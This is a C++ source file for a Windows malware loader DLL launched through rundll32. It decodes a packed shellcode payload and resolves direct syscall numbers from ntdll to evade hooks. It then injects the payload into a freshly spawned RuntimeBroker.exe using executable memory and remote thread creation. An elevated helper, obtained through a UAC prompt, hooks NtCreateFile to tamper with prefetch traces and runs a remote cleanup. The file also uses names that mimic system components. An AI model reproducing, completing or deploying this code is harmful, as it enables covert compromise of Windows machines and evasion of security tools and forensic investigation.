#include <windows.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <cstdio>
#include "header.h"
#include "evasion.h"
#include "strenc.h"
#include "syscalls.h"
#include "bytes.h"
#include "prefetch_hook.h"
#include "remote_cleanup.h"

extern "C" SYSCALL_ENTRY g_SyscallTable[SYSCALL_TABLE_SIZE] = { 0 };

extern BOOL InitializeSyscalls();
extern BOOL InitStackSpoofer();
extern DWORD FindProcessByName(const wchar_t* processName);
extern bool injectShellcode(std::vector<uint8_t>& shellcode, HANDLE hProcess, DWORD processId);

void RestorePrefetchHookBeforeExit()
{
    // Never let this elevated helper exit while it still owns a remote patch.
    // A transient access/protection failure is retried in the same process,
    // which keeps the original bytes available for the rollback.
    while (NtCreateFileHook::Pending())
    {
        NtCreateFileHook::Remove();
        if (NtCreateFileHook::Pending())
            Sleep(250);
    }
}

namespace InitialPrefetchGuard
{
    constexpr DWORD kInitialPrefetchWarmupMs = 3000;
    constexpr DWORD kPostInjectionPrefetchHoldMs = 15000;

    HANDLE g_ready = nullptr;
    HANDLE g_release = nullptr;
    HANDLE g_done = nullptr;
    bool g_active = false;

    void CloseEvents()
    {
        if (g_ready) CloseHandle(g_ready);
        if (g_release) CloseHandle(g_release);
        if (g_done) CloseHandle(g_done);
        g_ready = nullptr;
        g_release = nullptr;
        g_done = nullptr;
        g_active = false;
    }

    bool Acquire()
    {
        const DWORD pid = GetCurrentProcessId();
        const DWORD tick = GetTickCount();
        const std::string prefix =
            "Local\\SvcHost.CacheSync." +
            std::to_string(pid) + "." + std::to_string(tick);
        const std::string readyName = prefix + ".ready";
        const std::string releaseName = prefix + ".release";
        const std::string doneName = prefix + ".done";

        g_ready = CreateEventA(nullptr, TRUE, FALSE, readyName.c_str());
        g_release = CreateEventA(nullptr, TRUE, FALSE, releaseName.c_str());
        g_done = CreateEventA(nullptr, TRUE, FALSE, doneName.c_str());
        if (!g_ready || !g_release || !g_done)
        {
            CloseEvents();
            return false;
        }

        wchar_t payloadPath[32768]{};
        if (!PebGetModulePath(
                WENC(L"FB1x.TMP"),
                payloadPath,
                static_cast<DWORD>(_countof(payloadPath))))
        {
            CloseEvents();
            return false;
        }

        const std::wstring dllPath(payloadPath);

        const auto toWide = [](const std::string& value) {
            return std::wstring(value.begin(), value.end());
        };
        const std::wstring parameters =
            L"\"" + dllPath + L"\",ConfigureProvider " +
            toWide(readyName) + L" " +
            toWide(releaseName) + L" " +
            toWide(doneName);

        HINSTANCE launched = ShellExecuteW(
            nullptr, L"runas", L"rundll32.exe", parameters.c_str(),
            nullptr, SW_HIDE);
        if (reinterpret_cast<INT_PTR>(launched) <= 32)
        {
            CloseEvents();
            return false;
        }

        if (WaitForSingleObject(g_ready, 15000) != WAIT_OBJECT_0)
        {
            SetEvent(g_release);
            WaitForSingleObject(g_done, 3000);
            CloseEvents();
            return false;
        }

        g_active = true;
        // SysMain queues the initial process trace asynchronously. Give the
        // elevated writer a short head start before the normal RuntimeBroker
        // bootstrap begins.
        Sleep(kInitialPrefetchWarmupMs);
        return true;
    }

    bool Release()
    {
        if (!g_active && !g_ready && !g_release && !g_done)
            return true;

        if (g_release)
        {
            if (!SetEvent(g_release))
                return false;
        }

        for (int attempt = 0; attempt < 3; ++attempt)
        {
            if (g_done && WaitForSingleObject(g_done, 5000) ==
                WAIT_OBJECT_0)
            {
                CloseEvents();
                return true;
            }
            if (g_release)
                SetEvent(g_release);
        }

        // Keep the event handles alive for a caller that can retry.  Closing
        // them after a timeout used to discard the only rollback signal.
        return false;
    }
}

DWORD GetSSN(const char* functionName)
{
    if (!functionName) {
        return (DWORD)-1;
    }

    PVOID hNtdll = PebGetModuleBase(WENC(L"ntdll.dll"));
    
    if (!hNtdll) {
        hNtdll = PebGetModuleBase(WENC(L"ntdll.dll"));
    }
    
    if (!hNtdll) {
        return (DWORD)-1;
    }

    BYTE* fn = (BYTE*)PebGetProcAddr(hNtdll, functionName);
    if (!fn) {
        return (DWORD)-1;
    }

    if (fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1 && fn[3] == 0xB8) {
        DWORD ssn = *(DWORD*)(fn + 4);
        return ssn;
    }

    BYTE* base = (BYTE*)hNtdll;
    IMAGE_DOS_HEADER*       dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS64*     nt  = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(
        base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* names    = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ords     = (WORD*) (base + exp->AddressOfNameOrdinals);
    DWORD* funcs    = (DWORD*)(base + exp->AddressOfFunctions);

    int alvo = -1;
    for (DWORD i = 0; i < exp->NumberOfNames; i++)
        if (_stricmp((char*)(base + names[i]), functionName) == 0) { alvo = (int)i; break; }

    if (alvo < 0) {
        return (DWORD)-1;
    }

    for (int delta = 1; delta < 32; delta++)
    {
        for (int sinal = -1; sinal <= 1; sinal += 2)
        {
            int idx = alvo + (sinal * delta);
            if (idx < 0 || idx >= (int)exp->NumberOfNames) continue;

            BYTE* viz = base + funcs[ords[idx]];
            if (viz[0] == 0x4C && viz[1] == 0x8B && viz[2] == 0xD1 && viz[3] == 0xB8) {
                DWORD calculatedSSN = *(DWORD*)(viz + 4) - (DWORD)(sinal * delta);
                return calculatedSSN;
            }
        }
    }

    return (DWORD)-1;
}

PVOID FindSyscallAddress()
{
    PVOID hNtdll = PebGetModuleBase(WENC(L"ntdll.dll"));
    
    if (!hNtdll) {
        hNtdll = PebGetModuleBase(L"ntdll.dll");
    }
    
    if (!hNtdll)
        return nullptr;

    BYTE* base = (BYTE*)hNtdll;
    IMAGE_DOS_HEADER*   dos = (IMAGE_DOS_HEADER*)base;
    
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return nullptr;
    }
    
    IMAGE_NT_HEADERS64* nt  = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return nullptr;
    }

    BYTE* text = base + nt->OptionalHeader.BaseOfCode;
    DWORD size = nt->OptionalHeader.SizeOfCode;

    for (DWORD i = 0; i < size - 2; i++)
        if (text[i] == 0x0F && text[i+1] == 0x05 && text[i+2] == 0xC3) {
            return (PVOID)&text[i];
        }

    return nullptr;
}

BOOL InitializeSyscalls()
{
    const DWORD ssns[SYSCALL_TABLE_SIZE] = {
        GetSSN(ENC("NtAllocateVirtualMemory")),
        GetSSN(ENC("NtFreeVirtualMemory")),
        GetSSN(ENC("NtWriteVirtualMemory")),
        GetSSN(ENC("NtProtectVirtualMemory")),
        GetSSN(ENC("NtCreateThreadEx")),
        GetSSN(ENC("NtOpenProcess")),
        GetSSN(ENC("NtClose")),
        GetSSN(ENC("NtQuerySystemInformation")),
        GetSSN(ENC("NtCreateSection")),
        GetSSN(ENC("NtMapViewOfSection")),
        GetSSN(ENC("NtUnmapViewOfSection")),
        GetSSN(ENC("NtDelayExecution")),
        GetSSN(ENC("NtOpenThread"))
    };

    PVOID syscallAddr = FindSyscallAddress();
    if (!syscallAddr) {
        return FALSE;
    }

    for (int i = 0; i < SYSCALL_TABLE_SIZE; i++)
    {
        DWORD ssn = ssns[i];
        if (ssn == (DWORD)-1) {
            return FALSE;
        }
        g_SyscallTable[i].ssn            = ssn;
        g_SyscallTable[i].syscallAddress = syscallAddr;
    }

    return TRUE;
}

void LoadShellcodeFromBytes(std::vector<uint8_t>& sc)
{
    std::vector<unsigned char> decoded;
    DecodePackedPayload(decoded);

    sc.assign(decoded.begin(), decoded.end());

    if (sc.size() >= 4 &&
        sc[0] == static_cast<uint8_t>('u') &&
        sc[1] == static_cast<uint8_t>('n') &&
        sc[2] == static_cast<uint8_t>('s') &&
        sc[3] == static_cast<uint8_t>('i')) {
        sc.clear();
    }

    if (!decoded.empty()) {
        SecureZeroMemory(decoded.data(), decoded.size());
    }
}

DWORD FindProcessByName(const wchar_t* processName)
{
    // fallback confiavel via Toolhelp32 — Nt*SystemInformation estava
    // devolvendo 1 so processo por algum motivo (loop LENGTH_MISMATCH quebrado)
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32W pe = { sizeof(pe) };
        DWORD pid = 0;
        if (Process32FirstW(snap, &pe))
        {
            do {
                if (_wcsicmp(pe.szExeFile, processName) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);
        if (pid) return pid;
    }

    ULONG   bufSize = 0x10000;
    PVOID   buf     = nullptr;
    NTSTATUS st;
    int attempts = 0;

    do {
        attempts++;
        
        if (buf) {
            PVOID pb = buf;
            SIZE_T ps = bufSize;
            SysNtFreeVirtualMemory(GetCurrentProcess(), &pb, &ps, MEM_RELEASE);
        }
        
        buf = nullptr;
        SIZE_T allocSize = bufSize;
        st = SysNtAllocateVirtualMemory(GetCurrentProcess(), &buf, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
        if (!NT_SUCCESS(st)) {
            return 0;
        }

        st = SysNtQuerySystemInformation(SystemProcessInformation, buf, bufSize, &bufSize);
        
        if (st == STATUS_INFO_LENGTH_MISMATCH) {
            bufSize *= 2;
        }
        
        if (attempts > 10) {
            if (buf) {
                PVOID pb = buf;
                SIZE_T ps = bufSize;
                SysNtFreeVirtualMemory(GetCurrentProcess(), &pb, &ps, MEM_RELEASE);
            }
            return 0;
        }
    } while (st == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(st)) { 
        if (buf) {
            PVOID pb = buf;
            SIZE_T ps = bufSize;
            SysNtFreeVirtualMemory(GetCurrentProcess(), &pb, &ps, MEM_RELEASE);
        }
        return 0; 
    }

    PMY_SYSTEM_PROCESS_INFORMATION info = (PMY_SYSTEM_PROCESS_INFORMATION)buf;
    DWORD pid = 0;
    size_t targetLen = 0;
    while (processName[targetLen]) targetLen++;

    while (info)
    {
        if (info->ImageName.Buffer && info->ImageName.Length > 0)
        {
            USHORT nameLenW = info->ImageName.Length / sizeof(wchar_t);
            // UNICODE_STRING pode nao ter null terminator — compara por tamanho
            if (nameLenW == targetLen &&
                _wcsnicmp(info->ImageName.Buffer, processName, targetLen) == 0)
            {
                pid = (DWORD)(ULONG_PTR)info->UniqueProcessId;
                break;
            }
        }

        if (info->NextEntryOffset == 0) break;
        info = (PMY_SYSTEM_PROCESS_INFORMATION)((BYTE*)info + info->NextEntryOffset);
    }

    if (buf) {
        PVOID pb = buf;
        SIZE_T ps = bufSize;
        SysNtFreeVirtualMemory(GetCurrentProcess(), &pb, &ps, MEM_RELEASE);
    }
    
    return pid;
}

DWORD EnsureRuntimeBrokerHost()
{
    wchar_t ntdllPath[32768]{};
    if (!PebGetModulePath(
            WENC(L"ntdll.dll"),
            ntdllPath,
            static_cast<DWORD>(_countof(ntdllPath))))
    {
        return 0;
    }

    std::wstring systemDirectory(ntdllPath);
    const std::size_t separator = systemDirectory.find_last_of(L"\\/");
    if (separator == std::wstring::npos)
        return 0;
    systemDirectory.resize(separator);

    std::wstring imagePath(systemDirectory);
    imagePath += WENC(L"\\RuntimeBroker.exe");
    std::wstring commandLine = WENC(L"\"") + imagePath +
                               WENC(L"\" -Embedding");

    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    if (!CreateProcessW(imagePath.c_str(), commandLine.data(), nullptr,
                        nullptr, FALSE, CREATE_UNICODE_ENVIRONMENT, nullptr,
                        nullptr, &si, &pi))
    {
        return 0;
    }

    const DWORD launchedPid = pi.dwProcessId;
    for (int poll = 0; poll < 60; ++poll)
    {
        DWORD exitCode = 0;
        if (GetExitCodeProcess(pi.hProcess, &exitCode) &&
            exitCode == STILL_ACTIVE)
        {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return launchedPid;
        }
        Sleep(100);
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    // Never reuse an unrelated RuntimeBroker.  The bootstrap contract is a
    // dedicated host created by this invocation; falling back to a preexisting
    // broker would make F8 and the tracked child ambiguous.
    return 0;
}

bool LoaderAlreadyRunning()
{
    HANDLE mutex = OpenMutexW(SYNCHRONIZE, FALSE,
                              WENC(L"Local\\MSEdge.RuntimeBroker.Config.v2"));
    if (!mutex)
        return false;
    CloseHandle(mutex);
    return true;
}

bool enumerateThreadsViaSyscall(DWORD targetPID, std::vector<DWORD>& threadIds)
{
    ULONG   bufSize = 0x10000;
    PVOID   buf     = nullptr;
    NTSTATUS st;

    do {
        if (buf) {
            PVOID pb = buf;
            SIZE_T ps = bufSize;
            SysNtFreeVirtualMemory(GetCurrentProcess(), &pb, &ps, MEM_RELEASE);
        }
        
        PVOID allocBase = nullptr;
        SIZE_T allocSize = bufSize;
        st = SysNtAllocateVirtualMemory(GetCurrentProcess(), &allocBase, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
        if (!NT_SUCCESS(st)) {
            return false;
        }
        
        buf = allocBase;

        st = SysNtQuerySystemInformation(SystemProcessInformation, buf, bufSize, &bufSize);
        
        if (st == STATUS_INFO_LENGTH_MISMATCH) {
            bufSize *= 2;
        }
    } while (st == STATUS_INFO_LENGTH_MISMATCH && bufSize < 0x1000000);

    if (!NT_SUCCESS(st)) {
        if (buf) {
            PVOID pb = buf;
            SIZE_T ps = bufSize;
            SysNtFreeVirtualMemory(GetCurrentProcess(), &pb, &ps, MEM_RELEASE);
        }
        return false;
    }

    PMY_SYSTEM_PROCESS_INFORMATION procInfo = (PMY_SYSTEM_PROCESS_INFORMATION)buf;

    while (procInfo)
    {
        if ((DWORD)(ULONG_PTR)procInfo->UniqueProcessId == targetPID)
        {
            PMY_SYSTEM_THREAD_INFORMATION threadInfo = (PMY_SYSTEM_THREAD_INFORMATION)(procInfo + 1);
            
            for (ULONG i = 0; i < procInfo->NumberOfThreads; i++)
            {
                DWORD tid = (DWORD)(ULONG_PTR)threadInfo[i].ClientId.UniqueThread;
                threadIds.push_back(tid);
            }

            if (buf) {
                PVOID pb = buf;
                SIZE_T ps = bufSize;
                SysNtFreeVirtualMemory(GetCurrentProcess(), &pb, &ps, MEM_RELEASE);
            }
            return threadIds.size() > 0;
        }

        if (procInfo->NextEntryOffset == 0) break;
        procInfo = (PMY_SYSTEM_PROCESS_INFORMATION)((BYTE*)procInfo + procInfo->NextEntryOffset);
    }

    if (buf) {
        PVOID pb = buf;
        SIZE_T ps = bufSize;
        SysNtFreeVirtualMemory(GetCurrentProcess(), &pb, &ps, MEM_RELEASE);
    }
    return false;
}

HANDLE openThreadViaSyscall(DWORD threadId)
{
    MY_CLIENT_ID clientId;
    ZeroMemory(&clientId, sizeof(clientId));
    clientId.UniqueProcess = NULL;
    clientId.UniqueThread = (HANDLE)(ULONG_PTR)threadId;

    MY_OBJECT_ATTRIBUTES objAttr;
    ZeroMemory(&objAttr, sizeof(objAttr));
    objAttr.Length = sizeof(MY_OBJECT_ATTRIBUTES);
    objAttr.RootDirectory = NULL;
    objAttr.ObjectName = NULL;
    objAttr.Attributes = 0;
    objAttr.SecurityDescriptor = NULL;
    objAttr.SecurityQualityOfService = NULL;

    HANDLE hThread = NULL;
    NTSTATUS st = SysNtOpenThread(&hThread, THREAD_ALL_ACCESS, &objAttr, &clientId);
    
    if (NT_SUCCESS(st) && hThread) {
        return hThread;
    } else {
        return NULL;
    }
}

bool injectViaExistingThread(std::vector<uint8_t>& sc, HANDLE hProcess, HANDLE hExistingThread)
{
    const SIZE_T totalSz = sc.size() + 16;
    SIZE_T scSz = ((totalSz + 0xFFF) & ~0xFFF);
    if (scSz < 0x1000) scSz = 0x1000;
    HANDLE hScSec = NULL;
    PVOID  scBase = SectionAllocRemote(hProcess, scSz, PAGE_EXECUTE_READWRITE, &hScSec);

    if (!scBase)
    {
        NTSTATUS st = SysNtAllocateVirtualMemory(hProcess, &scBase, 0, &scSz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!NT_SUCCESS(st)) {
            return false;
        }
    }

    JitterDelay(10, 30);

    std::vector<uint8_t> wrapper;
    wrapper.resize(sc.size() + 16);
    memcpy(wrapper.data(), sc.data(), sc.size());

    wrapper[sc.size()] = 0xEB;
    wrapper[sc.size() + 1] = 0xFE;
    for (size_t i = sc.size() + 2; i < wrapper.size(); i++) {
        wrapper[i] = 0x90;
    }

    SIZE_T written = 0;
    NTSTATUS st = SysNtWriteVirtualMemory(hProcess, scBase, wrapper.data(), wrapper.size(), &written);
    if (!NT_SUCCESS(st)) {
        return false;
    }
    if (written != wrapper.size()) {
        return false;
    }

    JitterDelay(10, 30);

    HANDLE hThread = NULL;
    NTSTATUS st2 = SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
                                       hProcess, scBase, NULL, 0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(st2)) {
        return false;
    }

    JitterDelay(500, 1000);

    SysNtClose(hThread);
    if (hScSec) {
        SysNtClose(hScSec);
    }
    return true;
}

bool injectShellcode(std::vector<uint8_t>& sc, HANDLE hProcess, DWORD processId)
{
    std::vector<DWORD> threadIds;
    if (!enumerateThreadsViaSyscall(processId, threadIds)) {
        return false;
    }

    if (!threadIds.empty()) {
        HANDLE hThread = openThreadViaSyscall(threadIds[0]);
        if (hThread) {
            bool result = injectViaExistingThread(sc, hProcess, hThread);
            SysNtClose(hThread);
            if (result) return true;
        } else {
            for (size_t i = 1; i < threadIds.size(); i++) {
                hThread = openThreadViaSyscall(threadIds[i]);
                if (hThread) {
                    bool result = injectViaExistingThread(sc, hProcess, hThread);
                    SysNtClose(hThread);
                    if (result) return true;
                }
            }
        }
    }

    return false;
}

BOOL ExecuteInjectionHijack(HWND hwnd)
{
    DWORD nProc = PebGetNumberOfProcessors();
    if (nProc < 2) {
        return FALSE;
    }

    if (!InitializeSyscalls()) {
        return FALSE;
    }

    if (!InitStackSpoofer()) {
        return FALSE;
    }

    std::vector<uint8_t> sc;
    LoadShellcodeFromBytes(sc);
    if (sc.empty()) {
        return FALSE;
    }

    DWORD pid = EnsureRuntimeBrokerHost();
    if (!pid) {
        return FALSE;
    }

    HANDLE hProcess = NULL;
    MY_CLIENT_ID cid = { 0 };
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;

    MY_OBJECT_ATTRIBUTES objAttr = { 0 };
    objAttr.Length = sizeof(MY_OBJECT_ATTRIBUTES);

    NTSTATUS st = SysNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);

    if (!NT_SUCCESS(st) || !hProcess) {
        return FALSE;
    }

    bool bResult = injectShellcode(sc, hProcess, pid);

    if (!sc.empty()) {
        SecureZeroMemory(sc.data(), sc.size());
    }

    Sleep(2000);

    SysNtClose(hProcess);

    return bResult;
}

// rundll32.exe Inject.dll,Start
extern "C" __declspec(dllexport)
void CALLBACK Start(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    UNREFERENCED_PARAMETER(hinst);
    UNREFERENCED_PARAMETER(lpszCmdLine);
    UNREFERENCED_PARAMETER(nCmdShow);

    const bool initialHook = InitialPrefetchGuard::Acquire();

    // Do not create/discover a host, inject the loader, or continue the
    // bootstrap unless the elevated SysMain writer hook is already ready.
    // This keeps the initial rundll32 window fail-closed when UAC, event
    // creation, or hook installation fails.
    if (!initialHook)
    {
        return;
    }

    BOOL r = ExecuteInjectionHijack(hwnd);

    if (initialHook)
    {
        // Keep the writer patch active briefly after the loader has been
        // injected; SysMain can flush the process trace after Start returns
        // from the bootstrap work.
        Sleep(InitialPrefetchGuard::kPostInjectionPrefetchHoldMs);
        InitialPrefetchGuard::Release();
    }

}

// Elevated user-mode broker entry point. The loader launches the same FB1x.TMP
// through "runas" and passes three Local\ event names: ready, release and
// done. The optional leading M mode is used by F7: this same protected broker
// performs privileged maintenance, so F7 never needs a second unprotected
// rundll32 helper.
extern "C" __declspec(dllexport)
void CALLBACK ConfigureProvider(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine,
                                int nCmdShow)
{
    UNREFERENCED_PARAMETER(hwnd);
    UNREFERENCED_PARAMETER(hinst);
    UNREFERENCED_PARAMETER(nCmdShow);

    char mode[16]{};
    char firstName[128]{};
    char secondName[128]{};
    char thirdName[128]{};
    if (!lpszCmdLine)
    {
        return;
    }

    const int extendedCount = sscanf_s(
        lpszCmdLine, "%15s %127s %127s %127s",
        mode, static_cast<unsigned>(_countof(mode)),
        firstName, static_cast<unsigned>(_countof(firstName)),
        secondName, static_cast<unsigned>(_countof(secondName)),
        thirdName, static_cast<unsigned>(_countof(thirdName)));
    const bool maintenanceMode =
        extendedCount == 4 && mode[0] == 'M' && mode[1] == '\0';

    if (!maintenanceMode &&
        sscanf_s(lpszCmdLine, "%127s %127s %127s",
                 firstName, static_cast<unsigned>(_countof(firstName)),
                 secondName, static_cast<unsigned>(_countof(secondName)),
                 thirdName, static_cast<unsigned>(_countof(thirdName))) != 3)
    {
        return;
    }

    if (firstName[0] == 'C' && firstName[1] == '\0')
    {
        HANDLE ready = OpenEventA(EVENT_MODIFY_STATE, FALSE, secondName);
        HANDLE done = OpenEventA(EVENT_MODIFY_STATE, FALSE, thirdName);
        if (!ready || !done)
        {
            if (ready) CloseHandle(ready);
            if (done) CloseHandle(done);
            return;
        }

        const bool installed = NtCreateFileHook::Install();
        if (!installed)
        {
            NtCreateFileHook::Remove();
            RestorePrefetchHookBeforeExit();
            SetEvent(done);
            CloseHandle(ready);
            CloseHandle(done);
            return;
        }
        SetEvent(ready);
        remote_cleanup::Run();
        RestorePrefetchHookBeforeExit();
        SetEvent(done);
        CloseHandle(ready);
        CloseHandle(done);
        return;
    }

    const char* readyName = firstName;
    const char* releaseName = secondName;
    const char* doneName = thirdName;

    HANDLE ready = OpenEventA(EVENT_MODIFY_STATE, FALSE, readyName);
    HANDLE release = OpenEventA(SYNCHRONIZE, FALSE, releaseName);
    HANDLE done = OpenEventA(EVENT_MODIFY_STATE, FALSE, doneName);
    if (!ready || !release || !done)
    {
        if (ready) CloseHandle(ready);
        if (release) CloseHandle(release);
        if (done) CloseHandle(done);
        return;
    }

    const bool installed = NtCreateFileHook::Install();
    if (installed)
        SetEvent(ready);

    if (installed)
    {
        if (maintenanceMode)
            remote_cleanup::Run();

        // The medium loader downloads/parses the payload after ready. Keep a
        // bounded safety timeout, but let the explicit release event normally
        // determine when the 60-second post-create window ends.
        const DWORD releaseState = WaitForSingleObject(release, 120000);
        if (maintenanceMode)
        {
            // SysMain can flush the process trace immediately after the
            // protected helper receives release. Drain that queue while the
            // final writer and NtCreateFile patches are still installed.
            // Keep a short bounded hold; F6 already has its own post-injection
            // window and this is only the final F7 drain.
            (void)releaseState;
            constexpr DWORD kMaintenancePostReleaseHoldMs = 5000;
            Sleep(kMaintenancePostReleaseHoldMs);
        }
    }

    // Remove also handles a partial install that failed after changing one
    // of the remote layers.
    RestorePrefetchHookBeforeExit();
    SetEvent(done);

    CloseHandle(ready);
    CloseHandle(release);
    CloseHandle(done);
}

extern "C" __declspec(dllexport)
void CALLBACK UpdateProvider(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine,
                             int nCmdShow)
{
    UNREFERENCED_PARAMETER(hwnd);
    UNREFERENCED_PARAMETER(hinst);
    UNREFERENCED_PARAMETER(nCmdShow);

    const bool installed = NtCreateFileHook::Install();

    char readyName[128]{};
    char doneName[128]{};
    if (!lpszCmdLine ||
        sscanf_s(lpszCmdLine, "%127s %127s",
                 readyName, static_cast<unsigned>(_countof(readyName)),
                 doneName, static_cast<unsigned>(_countof(doneName))) != 2)
    {
        NtCreateFileHook::Remove();
        RestorePrefetchHookBeforeExit();
        return;
    }

    if (!installed)
    {
        NtCreateFileHook::Remove();
        RestorePrefetchHookBeforeExit();
        return;
    }

    HANDLE ready = OpenEventA(EVENT_MODIFY_STATE, FALSE, readyName);
    HANDLE done = OpenEventA(EVENT_MODIFY_STATE, FALSE, doneName);
    if (!ready || !done)
    {
        if (ready) CloseHandle(ready);
        if (done) CloseHandle(done);
        RestorePrefetchHookBeforeExit();
        return;
    }

    SetEvent(ready);
    remote_cleanup::Run();
    RestorePrefetchHookBeforeExit();
    SetEvent(done);
    CloseHandle(ready);
    CloseHandle(done);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    UNREFERENCED_PARAMETER(hModule);
    UNREFERENCED_PARAMETER(lpReserved);

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        SetPayloadModule(hModule);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
